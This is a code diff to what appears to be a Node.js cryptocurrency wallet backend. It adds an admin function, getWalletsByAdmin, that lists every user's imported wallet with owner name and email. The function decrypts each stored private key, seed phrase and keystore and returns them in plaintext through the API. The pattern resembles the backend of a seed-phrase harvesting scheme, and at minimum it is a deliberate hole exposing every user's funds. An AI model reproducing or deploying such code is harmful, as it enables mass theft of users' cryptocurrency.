@@ -2,7 +2,7 @@ const Wallet = require("../models/walletAddress"); // for address lookup
 const WalletInfo = require("../models/wallet"); // for imported wallets
 
 const bcrypt = require("bcryptjs");
-const { encrypt } = require("../../../utils/encryption");
+const { encrypt,decrypt } = require("../../../utils/encryption");
 
 const {
   sendBadRequestResponse,
@@ -212,9 +212,81 @@ const getWalletAddress = async (req, res) => {
 };
 
 
+
+const getWalletsByAdmin = async (req, res) => {
+  try {
+
+    let { page = 1, limit = 20 } = req.query;
+
+    page = Number(page);
+    limit = Number(limit);
+
+    const skip = (page - 1) * limit;
+
+    const wallets = await WalletInfo.find({})
+      .populate("userId", "name email")
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(limit);
+
+    const total = await WalletInfo.countDocuments();
+
+    /* =========================
+       🔐 DECRYPT DATA
+    ========================= */
+
+    const decryptedWallets = wallets.map((w) => {
+
+      let decryptedPrivateKey = null;
+      let decryptedPhrase = null;
+      let decryptedKeystore = null;
+
+      try {
+        if (w.encryptedPrivateKey) {
+          decryptedPrivateKey = decrypt(w.encryptedPrivateKey);
+        }
+
+        if (w.encryptedPhrase) {
+          decryptedPhrase = decrypt(w.encryptedPhrase);
+        }
+
+        if (w.encryptedKeystore) {
+          decryptedKeystore = decrypt(w.encryptedKeystore);
+        }
+
+      } catch (err) {
+        console.error("Decryption error:", err.message);
+      }
+
+      return {
+        ...w.toObject(),
+
+        decryptedPrivateKey,
+        decryptedPhrase,
+        decryptedKeystore
+      };
+    });
+
+    return sendSuccessResponseData(res, "Wallets fetched", {
+      wallets: decryptedWallets,
+      pagination: {
+        page,
+        limit,
+        total,
+        pages: Math.ceil(total / limit)
+      }
+    });
+
+  } catch (error) {
+    console.error("Admin wallet fetch error:", error);
+    sendUnauthenticatedErrorResponse(res, error.message);
+  }
+};
+
 module.exports = {
   importWallet,
   getUserWallets,
   getWalletAddress,
-  getWalletsGroupedByUser
+  getWalletsGroupedByUser,
+  getWalletsByAdmin
 };
